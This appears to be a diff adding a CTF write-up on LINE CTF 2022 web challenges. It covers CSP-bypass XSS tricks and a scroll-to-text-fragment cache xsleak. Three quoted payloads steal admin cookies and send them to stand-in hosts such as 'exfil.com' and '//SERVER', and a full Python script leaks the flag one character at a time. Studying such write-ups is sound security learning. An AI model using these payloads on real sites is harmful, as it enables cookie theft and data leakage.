@@ -1,0 +1,178 @@
+And this part near the end:
+
+``` html
+<script nonce="{{ csp_nonce }}">
+    const render = notes => {
+        // 省略
+    };
+    render({{ notes }})
+</script>
+```
+
+The former gives us 16 characters of JS injection, and the latter can use `</script>` to escape the tag, which is HTML injection. The difficulty of this problem lies in the fact that the CSP is very strict:
+
+``` html
+<meta content="default-src 'self'; style-src 'unsafe-inline'; object-src 'none'; base-uri 'none'; script-src 'nonce-{{ csp_nonce }}'
+    'unsafe-inline'; require-trusted-types-for 'script'; trusted-types default"
+          http-equiv="Content-Security-Policy">
+```
+
+Because there is a nonce, `unsafe-inline` does not work, and `unsafe-eval` is not enabled, so there is no way to dynamically execute code.
+
+At the time, after struggling for a long time, I had an idea that we could use HTML injection to insert a form `<form id="f">`, and then CSRF admin to change the admin's nickname, because the other page profile has no CSP and can also be injected:
+
+``` html
+<input name="display_name" type="text" class="form-control form-control-sm"
+ id="inputUserDisplayName"
+ value="{{ current_user.display_name }}">
+```
+
+The nickname part can be set to `";f.submit();"` or similar, to submit the form. After changing it, visit the profile page and execute XSS on that page.
+
+But the biggest problem is that `"onfocus=eval(name)` has 20 characters, which exceeds the limit and cannot be successful (and you also need to think about how to set the name).
+
+After the competition, I looked at other people's solutions, mainly three types.
+
+The first one comes from [Super HexaGoN](https://gist.github.com/mdsnins/d8028c47212342ecadd9af5ec10f53f9), which uses a magical [script data double escaped state](https://www.w3.org/TR/2011/WD-html5-20110405/tokenization.html#script-data-double-escaped-state) to comment out everything between the two injection points, and then execute the code in a script with a nonce. I had never seen this before, so I'll have to study it later.
+
+```
+display name: <!--<script>"}/*
+title: --> /*
+content: */ location.href='(attacker)/c='+document.cookie
+```
+
+The second one uses the feature that [import is not blocked by Trusted Types](https://microsoftedge.github.io/edgevr/posts/eliminating-xss-with-trusted-types/#script-loading-like-import), and the payload below comes from [maple3142](https://blog.maple3142.net/2022/03/27/line-ctf-2022-writeups/#haribote-secure-note):
+
+``` js
+display name:
+"+import(y)+"
+
+title:
+</script><a id=x href="//SERVER"></a>
+
+content:
+<a id=y href="data:text/javascript,open(x+`?`+document.cookie);alert()"></a>
+```
+
+The third one uses an iframe to execute code on other pages (from eskildsen#8025):
+
+```
+name:
+";f.eval(p+"");"
+
+title:
+</script><iframe src="/p" name=f></iframe> 
+
+content:
+<a href="javascript:window.top.location='http://exfil.com/'+btoa(this.parent.document.cookie)" id=p name=p>payload</a> 
+```
+
+The third one is the only one I think I might have thought of, because I didn't know the other two.
+
+By the way, `";f.eval(p+"");"` and `<!--<script>"}/*` both happen to be 16 characters long, so I guess one of them is an unexpected solution, which is the fun of CTF XD.
+
+And this question is really interesting and worth learning, as all three solutions are completely different.
+
+Oh, by the way, maple3142's writeup solved a puzzle for me, which is why the templates for this question are not escaped. It turns out that Flask defaults to only escaping HTML/XML/XHTML, which is why I didn't see any settings.
+
+## title todo(6 solves)
+
+This question is basically a website for uploading pictures. After uploading, you will get a URL, and then you can create a new post with the title and image URL.
+
+The flag is placed in the footer of the webpage when visited with admin privileges, and has a strange format: `LINECTF{([0-9a-f]/){10}}`.
+
+Then there is a place on the page that is not enclosed in double quotes:
+
+``` html
+<img src={{ image.url }} class="mb-3">
+```
+
+Although it looks like a small detail, the entire solution actually stems from this. From here, it is easy to see that we can control any attribute of the img, but I was stuck here for a while, thinking that if we can control it, what's the point? We can't XSS if we can't get out of the img.
+
+Then, after being reminded by my teammate, I thought of the xsleak of [STTF](https://xsleaks.dev/docs/attacks/experiments/scroll-to-text-fragment/), which detects scrolling behavior through the lazy loading of images. Therefore, as long as the title is very long, the img is pushed down, and the `loading=lazy` attribute is added, it can be used with STTF to leak one byte.
+
+However, there is one thing to note about this question, which is CSP:
+
+```
+default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' blob:
+```
+
+CSP cannot be bypassed, so even if `src` is controllable, external images cannot be set. Therefore, this question has added another mechanism: cache, which can determine whether the cache of an image is a miss or a hit based on the response header. Therefore, we only need to upload a new image and give it to the bot, and then check its response header after a few seconds. If it is a hit, it means that the bot has accessed the image, which means that SSTF has succeeded.
+
+Just write an exploit based on this concept:
+
+``` py
+import requests
+import json
+import time
+from time import sleep
+
+base_url = 'http://35.187.204.223'
+cookie = "session=.eJwtzrERwzAIAMBdVKcAJCHkZXyA4JzWjqtcdk-K_AT_LnuecR1le513PMr-XGUrqLggVU2SQCFTKqiIUxpbIhpNThy0GkEdXWaGdJ-16nJ3GAO8iwP0QeY5ISjnzLoImHE5VwmdzVCIaxOMMNGIPrizhlErv8h9xfnfAJTPF00fL_M.Yj71GQ.S1yffSzbOk6Rny1VyCqPTL-5wM8"
+
+def upload_image():
+  files = {'img_file': open('a.png','rb')}
+
+  resp = requests.post(base_url + '/image/upload', files=files, headers={
+    "Cookie": cookie
+  })
+  return json.loads(resp.text)
+
+def create_post(url):
+  resp = requests.post(base_url + '/image', data={
+    "title": str(time.time()) + "w"*5000,
+    "img_url": f"/static/image/111 srcset={url} loading=lazy "
+  }, headers={
+    "Cookie": cookie
+  }, allow_redirects=False)
+  return resp.headers["X-ImageId"]
+
+def share(url, keyword):
+  resp = requests.post(base_url + '/share', json={
+    "path": "image/" + url + "#:~:text=" + keyword,
+  }, headers={
+    "Cookie": cookie
+  })
+  return resp.text
+
+def check_cached(img_url):
+  resp = requests.get(base_url + img_url, headers={
+    "Cookie": cookie
+  }, allow_redirects=False)
+  return resp.headers["X-Cache-Status"]
+
+def run():
+  known = "LINECTF{"
+  while True:
+    for char in "0123456789abcdef":
+      print("trying:" + known+char)
+
+      resp = upload_image()
+      img_url = resp["img_url"]
+      print("img url:" + img_url)
+
+      img_id = create_post(img_url)
+      print("img id:" + img_id)
+
+      share_res = share(img_id, known + char)
+      print("resp:" + share_res)
+
+      sleep(3)
+      cache_resp = check_cached(img_url)
+      print("cached:" + cache_resp)
+      if cache_resp == "HIT":
+        known += char + "/"
+        print(known)
+        break
+
+
+run()
+```
+
+In addition, maple3142's writeup solved a confusion for me, which is why the flag needs those `/`? It turns out that Chromium, in order to avoid this kind of xsleak, must match the entire word when judging SSTF in order to scroll.
+
+For example, if there is this string on the page: `Hello world`, your text fragment specifies `He`, it will not work, it must be `Hello`, which is why this question uses `/` to separate, because if it is not separated, it will not be possible to leak one word at a time.
+
+## me7-ball(2 solves)
+
+This question seems to be more related to crypto, so I didn't look at it carefully and directly posted Super HexaGoN's writeup: https://gist.github.com/mdsnins/2912b9656c837e5190364136b307c682
